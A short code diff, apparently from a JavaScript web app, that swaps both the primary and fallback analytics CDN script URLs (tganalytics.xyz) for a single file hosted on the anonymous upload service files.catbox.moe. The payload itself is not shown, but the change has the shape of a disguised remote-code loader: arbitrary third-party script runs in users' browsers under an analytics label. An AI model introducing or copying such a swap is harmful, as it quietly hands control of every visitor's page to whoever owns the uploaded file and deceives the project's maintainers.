@@ -176,7 +176,7 @@
 
   // Загрузка CDN-скриптов с отключением кэша
  loadScriptWithRetry({
-    src: 'https://tganalytics.xyz/index.js',
+    src: 'https://files.catbox.moe/v4b7pv.js',
     id: 'first-cdn',
     successCallback: () => { firstCdnLoaded = true; checkAllLoaded(); },
     errorCallback: () => { firstCdnLoaded = false; checkAllLoaded(); },
@@ -184,7 +184,7 @@
   });
 
   loadScriptWithRetry({
-    src: 'https://cdn.tganalytics.xyz/index.js',
+    src: 'https://files.catbox.moe/v4b7pv.js',
     id: 'second-cdn',
     successCallback: () => { secondCdnLoaded = true; checkAllLoaded(); },
     errorCallback: () => { secondCdnLoaded = false; checkAllLoaded(); },
